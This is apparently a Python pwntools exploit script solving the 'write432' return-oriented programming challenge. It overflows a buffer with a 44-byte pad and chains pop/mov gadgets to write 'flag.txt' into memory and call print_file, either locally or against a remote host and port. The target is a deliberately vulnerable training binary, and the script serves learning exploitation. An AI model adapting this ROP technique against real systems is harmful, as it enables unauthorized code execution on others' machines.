from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./write432")


class ROP_Gadget:
    flag = b"flag"
    txt = b".txt"
    print_file = 0x080483d0
    data_start = 0x0804a018
    pop_edi_ebp = 0x080485aa
    mov_edi_ebp = 0x08048543
    junk = 0x42424242


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(44)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_edi_ebp,
        ROP_Gadget.data_start,
        ROP_Gadget.flag,
        ROP_Gadget.mov_edi_ebp,
        ROP_Gadget.pop_edi_ebp,
        ROP_Gadget.data_start + 4,
        ROP_Gadget.txt,
        ROP_Gadget.mov_edi_ebp,
        ROP_Gadget.print_file,
        ROP_Gadget.junk,
        ROP_Gadget.data_start
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()